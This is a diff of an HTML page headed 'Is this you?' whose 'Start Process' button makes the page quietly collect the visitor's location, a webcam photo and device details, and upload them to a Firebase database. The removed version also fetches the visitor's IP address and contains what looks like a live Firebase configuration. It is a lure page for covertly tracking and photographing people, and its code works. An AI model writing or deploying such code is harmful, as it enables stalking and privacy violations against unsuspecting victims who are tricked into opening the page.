@@ -3,173 +3,157 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Data Sender</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <title>Sender</title>
     <style>
         body {
-            font-family: 'Arial', sans-serif;
-            background-color: #121212;
-            color: #ffffff;
+            font-family: Arial, sans-serif;
             text-align: center;
-            margin: 0;
-            padding: 0;
-            overflow: hidden;
+            margin-top: 50px;
         }
-        h1 {
-            color: #00ff00;
-            margin-top: 20px;
-        }
-        #loading-screen {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.8);
-            color: #ffffff;
-            justify-content: center;
-            align-items: center;
-            z-index: 999;
-        }
-        #loading-message {
-            font-size: 24px;
-            font-weight: bold;
-        }
-        .container {
-            margin: 20px auto;
-            max-width: 400px;
-        }
-        .button {
-            background-color: #00cc00;
+        #start-button {
+            padding: 10px 20px;
+            background-color: #4CAF50;
             color: white;
-            padding: 15px 30px;
             border: none;
-            border-radius: 5px;
             cursor: pointer;
-            font-size: 18px;
-            transition: background-color 0.3s;
-            width: 100%;
+            font-size: 16px;
         }
-        .button:hover {
-            background-color: #009900;
-        }
-        .error-message {
-            color: #ff0000;
-            margin: 10px 0;
+        #start-button:hover {
+            background-color: #45a049;
         }
     </style>
+    <!-- Include Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database.js"></script>
 </head>
 <body>
-    <div id="loading-screen">
-        <div id="loading-message">
-            <i class="fas fa-spinner fa-spin"></i> Sending data, please wait...
-        </div>
-    </div>
-    <div class="container">
-        <h1>Is This You?</h1>
-        <p>Please allow access to your location and camera for the best experience.</p>
-        <button class="button" id="start-button">Start Process</button>
-        <div id="error-message" class="error-message"></div>
-    </div>
 
-    <script type="module">
+    <h1>Is this you?</h1>
+    <button id="start-button">Start Process</button>
+    
+    <script>
         // Firebase configuration
         const firebaseConfig = {
-            apiKey: "AIzaSyDGOfNv0d5SlEsq2LvOJZJEJSgANeswKd4",
-            authDomain: "maptracker-7afb6.firebaseapp.com",
-            databaseURL: "https://maptracker-7afb6-default-rtdb.firebaseio.com",
-            projectId: "maptracker-7afb6",
-            storageBucket: "maptracker-7afb6.appspot.com",
-            messagingSenderId: "874600101063",
-            appId: "1:874600101063:web:79d8010dee2bf0e57f7ae2",
-            measurementId: "G-HTXZEYZ3DK"
+            apiKey: "YOUR_FIREBASE_API_KEY",
+            authDomain: "YOUR_FIREBASE_PROJECT_ID.firebaseapp.com",
+            databaseURL: "https://YOUR_FIREBASE_PROJECT_ID.firebaseio.com",
+            projectId: "YOUR_FIREBASE_PROJECT_ID",
+            storageBucket: "YOUR_FIREBASE_PROJECT_ID.appspot.com",
+            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+            appId: "YOUR_APP_ID"
         };
 
         // Initialize Firebase
-        const { initializeApp } = await import("https://www.gstatic.com/firebasejs/9.14.0/firebase-app.js");
-        const { getDatabase, ref, set } = await import("https://www.gstatic.com/firebasejs/9.14.0/firebase-database.js");
-
-        const app = initializeApp(firebaseConfig);
-        const database = getDatabase(app);
-
-        const loadingScreen = document.getElementById('loading-screen');
-        const errorMessage = document.getElementById('error-message');
+        const app = firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
 
         document.getElementById('start-button').addEventListener('click', startProcess);
 
         async function startProcess() {
-            errorMessage.innerHTML = ''; // Clear previous errors
-            loadingScreen.style.display = 'flex'; // Show loading screen
-            
             try {
-                // Request location permission and get the position
-                const position = await getLocation();
-                // Request camera permission and take a screenshot
-                const screenshot = await takeScreenshot();
-                // Uploading position and screenshot
-                await uploadData(position, screenshot);
+                const locationData = await getLocation();
+                const deviceData = getDeviceInfo();
+                const screenshotURL = await captureScreenshot();
+                
+                // Upload the data
+                uploadData(locationData, deviceData, screenshotURL);
             } catch (error) {
-                errorMessage.innerHTML = error.message;
-            } finally {
-                loadingScreen.style.display = 'none'; // Hide loading screen
+                console.error("Error during process:", error);
             }
         }
 
-        // Function to get location
+        // Get Location Data
         function getLocation() {
             return new Promise((resolve, reject) => {
-                if (!navigator.geolocation) {
-                    return reject(new Error("Geolocation is not supported by your browser."));
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const locationData = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude
+                            };
+                            resolve(locationData);
+                        },
+                        (error) => {
+                            reject('User denied geolocation or an error occurred.');
+                        }
+                    );
+                } else {
+                    reject('Geolocation is not supported by this browser.');
                 }
-                navigator.geolocation.getCurrentPosition(resolve, reject);
             });
         }
 
-        // Function to take screenshot from camera
-        async function takeScreenshot() {
-            const video = document.createElement('video');
-            video.autoplay = true;
+        // Get Device Information
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent || 'Unknown User Agent',
+                memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown Memory',
+                platform: navigator.platform || 'Unknown Platform',
+                language: navigator.language || 'Unknown Language'
+            };
+        }
 
+        // Capture Screenshot (using Canvas)
+        async function captureScreenshot() {
             try {
-                // Access camera
-                video.srcObject = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                video.play();
+
+                return new Promise((resolve, reject) => {
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // Stop the camera stream after screenshot
+                        stream.getTracks().forEach(track => track.stop());
+
+                        // Convert the canvas to a data URL (image)
+                        const screenshotURL = canvas.toDataURL('image/png');
+                        resolve(screenshotURL);
+                    }, 1000); // Capture the screenshot after 1 second
+                });
             } catch (error) {
-                throw new Error("Unable to access the camera.");
+                console.error('Error capturing screenshot:', error);
+                return null; // Return null if screenshot fails
             }
+        }
 
-            document.body.appendChild(video); // Append video to the body to access the stream
+        // Upload Data to Firebase
+        function uploadData(locationData, deviceData, screenshotURL) {
+            const sessionData = {
+                location: locationData || { latitude: 'unknown', longitude: 'unknown' },
+                deviceInfo: deviceData || { userAgent: 'Unknown', memory: 'Unknown', platform: 'Unknown', language: 'Unknown' },
+                screenshot: screenshotURL || 'No screenshot available',
+                timestamp: Date.now()
+            };
 
-            return new Promise((resolve) => {
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0);
-                    video.srcObject.getTracks().forEach(track => track.stop()); // Stop the video stream
-                    document.body.removeChild(video); // Clean up the video element
-                    resolve(canvas.toDataURL('image/png')); // Return the screenshot as base64 string
-                }, 1000); // Take the screenshot after 1 second
+            // Check for undefined properties and filter them out
+            const filteredData = filterUndefinedData(sessionData);
+
+            // Push data to Firebase
+            firebase.database().ref('/sessions').push(filteredData)
+            .then(() => {
+                console.log('Data uploaded successfully');
+            })
+            .catch((error) => {
+                console.error('Error uploading data:', error);
             });
         }
 
-        // Function to upload data to Firebase
-        async function uploadData(position, screenshot) {
-            const dataRef = ref(database, 'users/' + Date.now());
-            await set(dataRef, {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                timestamp: Date.now(),
-                userAgent: navigator.userAgent,
-                deviceMemory: navigator.deviceMemory,
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                screenResolution: `${screen.width}x${screen.height}`,
-                ipAddress: await fetch('https://api.ipify.org?format=json').then(response => response.json()).then(data => data.ip),
-                language: navigator.language,
-                platform: navigator.platform,
-                screenshot: screenshot // Add screenshot data
-            });
+        // Filter out undefined data
+        function filterUndefinedData(dataObject) {
+            return Object.keys(dataObject).reduce((filteredData, key) => {
+                if (dataObject[key] !== undefined) {
+                    filteredData[key] = dataObject[key];
+                }
+                return filteredData;
+            }, {});
         }
     </script>
 </body>
